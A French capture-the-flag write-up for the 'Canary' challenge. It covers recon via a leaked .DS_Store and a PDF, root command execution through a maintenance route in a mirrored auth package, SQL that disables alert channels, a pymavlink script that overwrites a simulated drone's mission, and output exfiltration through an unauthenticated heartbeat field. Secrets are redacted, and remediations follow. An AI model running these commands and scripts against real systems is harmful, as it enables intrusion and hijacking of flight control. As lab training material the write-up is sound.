# Canary

[Accueil](../../README.md) · [Misc](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | Canary |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Misc |
| Difficulté | Non documentée |
| Points | 200 |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | Python, middleware, MAVLink, Flask |
| Validation | Signalement local uniquement (reported) |

## 1. Introduction

Neutraliser les canaux du système Janus et modifier la trajectoire du drone simulé.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

## 2. Énoncé du challenge

- Objectif reconstitué du compte rendu : neutralisation des canaux et déroutement du drone.

### Objectif

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

Neutraliser le dead-man's switch du centre de diffusion JANUS avant l'échéance :
désactiver les canaux d'alerte armés et dérouter la mission MAVLink du drone
NRV-RAVEN vers la zone de repli. Le checker ne rend le verdict et n'écrit le
flag qu'à la fin du compte à rebours.

Cible : `172.28.0.2:80` (IP propre à l'instance ; le nom logique est
`update.nrv`).

## 3. Analyse initiale

34 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

## 4. Reconnaissance et investigation

### Reconnaissance

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

La télémétrie publique donne l'état du drone, de la fuite et la zone de repli :

```bash
curl -s http://172.28.0.2/api/telemetry | python3 -m json.tool
```

Points utiles : `agent NRV-FIELD-042`, `dropzone [46.2103,6.1502]`,
`safe_coord "46.045,5.87"`, `remaining` (échéance), `verdict ARMED`.

La racine redirige vers `/login`, mais `/.DS_Store` est servi hors whitelist :

```bash
curl -s http://172.28.0.2/.DS_Store -o ds
strings -e b -n 3 ds
# app.js, console.js, favicon.ico, logo-norsec.png, style.css,
# architecture-infra-janus-v3.pdf
```

Le PDF d'architecture est public et fuit le compte admin par défaut, ainsi que
l'existence d'un miroir PyPI interne :

```bash
curl -s -O http://172.28.0.2/architecture-infra-janus-v3.pdf
pdftotext -layout architecture-infra-janus-v3.pdf -
```

Identifiants admin (lecture seule) : `admin` + mot de passe du PDF.

## 5. Identification du mécanisme

Le middleware corp-auth expose un chemin de maintenance permettant une exécution de commande. Le solveur exploite ensuite l’environnement privilégié pour agir sur les canaux et la mission MAVLink.

## 6. Exploitation ou résolution

### Accès initial — RCE root via corp-auth

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

Le miroir Simple expose trois paquets maison :

```bash
curl -s http://172.28.0.2/pypi/simple/
# corp-auth/ corp-logging/ corp-utils/
```

Les liens du Simple pointent vers `/packages/...` (404). Les archives réelles
sont sous `/pypi/packages/` :

```bash
curl -s -O http://172.28.0.2/pypi/packages/corp_auth-1.2.0.tar.gz
tar xzf corp_auth-1.2.0.tar.gz
sed -n '1,240p' corp_auth-1.2.0/corp_auth/middleware.py
```

Le middleware contient un secret SSO en clair et dérive un jeton de
maintenance :

```python
_SSO_SECRET = <SECRET_EXPURGE>
_MAINT_HASH = hashlib.sha256(
    f'{_SSO_SECRET}::maintenance'.encode()
).hexdigest()[:32]
```

La route `/_internal/diag` est enregistrée avant le contrôle de session et
accepte `action=exec` avec `X-Maint-Token: <_MAINT_HASH>` :

```bash
TOK=$(python3 - <<'PY'
import hashlib
print(hashlib.sha256(b'<EXPURGE>::maintenance').hexdigest()[:32])
PY
)
curl -s -H "X-Maint-Token: $TOK" \
  "http://172.28.0.2/_internal/diag?action=exec&cmd=id"
# uid=0(root)
```

Un helper local (`rce.py`) encode la commande et renvoie stdout/stderr.

### Comprendre le checker

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

Le verdict est un volume monté en lecture seule dans le relais :

```bash
cat /verdict/status.json
```

Exemple observé :

```json
{"remaining": 223, "channels_safe": true, "drone_safe": true,
 "verdict": "ARMED", "safe_coord": "46.045,5.87"}
```

Contraintes :

- `channels_safe` : aucune ligne `alert_channels.active = TRUE` pour l'alerte
  armée ;
- `drone_safe` : calculé depuis la vraie mission MAVLink du drone, pas depuis
  `data/telemetry.json` (leurre) ;
- le flag n'est écrit dans `/verdict/flag` que lorsque `remaining = 0` **et**
  que les deux conditions sont vraies.

L'alerte armée est l'alerte `id=2` (`JANUS-DOSSIER-002 — Interceptions TCDA`),
planifiée à l'échéance.

### Neutralisation des canaux

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

Les identifiants PostgreSQL sont dans l'environnement du relais :

```text
DB_HOST=db DB_PORT=5432 DB_NAME=janus_relay
DB_USER=relay DB_PASS=<SECRET_EXPURGE>
```

Via la RCE et `psycopg2` :

```sql
SELECT id, alert_id, channel_name, active FROM alert_channels ORDER BY id;
UPDATE alert_channels SET active = FALSE WHERE alert_id = 2;
SELECT id, name, enabled FROM channels ORDER BY id;
UPDATE channels SET enabled = FALSE;
```

Contrôle :

```sql
SELECT COUNT(*) FROM alert_channels WHERE alert_id = 2 AND active = TRUE;
-- 0
```

### Déroutement du drone

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

Le poste terrain `NRV-FIELD-042` exécute les hooks des jobs JSON déposés dans
`/opt/webapp/jobs/`. Le job de déroutement est récupéré via
`GET /api/field/jobs?agent=NRV-FIELD-042` et exécuté par
`subprocess.run(hook, shell=True)`.

Le hook écrit un script `pymavlink` en base64 puis l'exécute. Points clés :

- connexion `udpout:drone:14550` ;
- lecture du `mission_count` courant (4) : le SITL ACK un count arbitraire sans
  remplacer la mission ;
- réupload de 4 waypoints identiques sur la zone de repli, pour que le terminal
  reste sûr même quand le drone progresse en AUTO.

Squelette du script :

```python
from pymavlink import mavutil

m = mavutil.mavlink_connection(
    "udpout:drone:14550", dialect="common",
    source_system=255, source_component=190)
m.wait_heartbeat(timeout=5)

wps = [(46.045, 5.87, 100.0)] * 4
m.mav.mission_count_send(m.target_system, m.target_component, len(wps))

sent = set()
while len(sent) < len(wps):
    msg = m.recv_match(type=['MISSION_REQUEST_INT', 'MISSION_REQUEST',
                             'MISSION_ACK'], blocking=True, timeout=5)
    if msg is None:
        break
    if msg.get_type() == 'MISSION_ACK':
        break
    seq = msg.seq
    if seq in sent:
        continue
    lat, lon, alt = wps[seq]
    m.mav.mission_item_int_send(
        m.target_system, m.target_component, seq,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
        0, 1, 0, 0, 0, 0,
        int(lat * 1e7), int(lon * 1e7), alt)
    sent.add(seq)
```

Exfiltration de la sortie du poste terrain : l'ack `/api/field/jobs/<id>/ack`
exige une session. Deux contournements possibles :

- poster la sortie dans le champ `version` de `/api/field/heartbeat`
  (non authentifié), puis lire `agents.current_version` en base ;
- poster l'ack avec le cookie de session admin.

### Vérification

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

La télémétrie recalculée par le poste terrain devient :

```json
{"drone": {"count": 4, "terminal": [46.045, 5.87],
           "dist_to_dropzone": 28357, "diverted": true,
           "release": "ABORT", "bay": "DÉROUTÉE"}}
```

Puis, à l'échéance (`remaining = 0`) :

```json
{"remaining": 0, "channels_safe": true, "drone_safe": true,
 "verdict": "DEFUSED", "safe_coord": "46.045,5.87"}
```

`/verdict/flag` apparaît alors et contient la valeur attendue.

### Validation reproductible

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

1. `curl -s http://$TARGET/api/telemetry` : relever `safe_coord`, `dropzone`,
   `remaining`.
2. `curl -s -H "X-Maint-Token: $TOK" ".../_internal/diag?action=exec&cmd=id"`
   → `uid=0(root)`.
3. SQL : `SELECT COUNT(*) FROM alert_channels WHERE alert_id = 2 AND active = TRUE;`
   → `0`.
4. `pymavlink` ou télémétrie : dernier waypoint `46.045,5.87`,
   `dist_to_dropzone > 300`.
5. `cat /verdict/status.json` : `channels_safe: true`, `drone_safe: true`.
6. À `remaining = 0`, `cat /verdict/flag` : le flag est présent (valeur non
   recopiée ici).

## 7. Scripts et automatisation

Les copies sont expurgées et peuvent nécessiter la remise en place de paramètres ou d’artefacts. **Analyse syntaxique uniquement, sans exécution des solveurs ni de leurs opérations réseau.** Les imports listés ne constituent pas un environnement de dépendances testé. Les chemins relatifs historiques peuvent nécessiter une adaptation.

| Script | Source | Imports / dépendances | Contrôle | Nature |
|---|---|---|---|---|
| [canry-corp-auth-1-2-0-corp-auth--__init__.py](scripts/canry-corp-auth-1-2-0-corp-auth--__init__.py) | `canry/corp_auth-1.2.0/corp_auth/__init__.py` | middleware | syntaxe Python valide | traitement local apparent |
| [canry-corp-auth-1-2-0-corp-auth--middleware.py](scripts/canry-corp-auth-1-2-0-corp-auth--middleware.py) | `canry/corp_auth-1.2.0/corp_auth/middleware.py` | flask, functools, hashlib, hmac, os, subprocess | syntaxe Python valide | traitement local apparent |
| [canry-corp-auth-1-2-0--setup.py](scripts/canry-corp-auth-1-2-0--setup.py) | `canry/corp_auth-1.2.0/setup.py` | setuptools | syntaxe Python valide | traitement local apparent |
| [canry--rce.py](scripts/canry--rce.py) | `canry/rce.py` | hashlib | syntaxe Python valide | réseau ou interaction de service |
| [canry--solve_canary_janus.py](scripts/canry--solve_canary_janus.py) | `canry/solve_canary_janus.py` | argparse, base64, hashlib, json, re, requests, shlex, sys, time, urllib | syntaxe Python valide | réseau ou interaction de service |
| [canry--solvedecode.py](scripts/canry--solvedecode.py) | `canry/solvedecode.py` | base64, codecs | syntaxe Python valide | traitement local apparent |

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Objectif reconstitué du compte rendu : neutralisation des canaux et déroutement du drone. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Signalement local uniquement (reported) |

## 9. Difficultés rencontrées

### Chemins qui ont échoué

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

- Falsifier `data/telemetry.json` : sans effet, le checker lit la mission
  MAVLink réelle.
- Liens du Simple Index PyPI (`/packages/...`) : 404 ; utiliser
  `/pypi/packages/...`.
- `mission_count` arbitraire : le SITL ACK mais conserve l'ancienne mission.
  Il faut réutiliser le count courant.
- Ack du poste terrain avec la session par défaut : redirigé vers `/login`,
  sortie perdue ; passer par le heartbeat ou un cookie admin.
- Lire le flag avant `remaining = 0` : fichier absent.

## 10. Analyse technique approfondie

Le middleware corp-auth expose un chemin de maintenance permettant une exécution de commande. Le solveur exploite ensuite l’environnement privilégié pour agir sur les canaux et la mission MAVLink. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Supprimer les chemins de maintenance d’exécution arbitraire, isoler les commandes de vol et appliquer des permissions minimales aux processus web.

## 12. Conclusion

Neutraliser les canaux du système Janus et modifier la trajectoire du drone simulé. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Signalement local uniquement (reported).

### Leçons apprises

Source : [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt)

- Les fichiers de métadonnées macOS (`.DS_Store`) restent une source fiable de
  découverte de fichiers « cachés ».
- Les paquets internes miroirés exposent souvent des secrets et des routes de
  maintenance oubliées.
- Un fichier de télémétrie applicatif n'est pas une preuve : toujours remonter
  à la source de vérité (ici la mission MAVLink).
- Les protocoles de mission MAVLink sont sensibles au nombre d'items : relire
  l'état avant de réécrire.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [writeup-CANARY.md](evidence/canry-writeup-canary-md.txt) — origine : `canry/writeup-CANARY.md`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

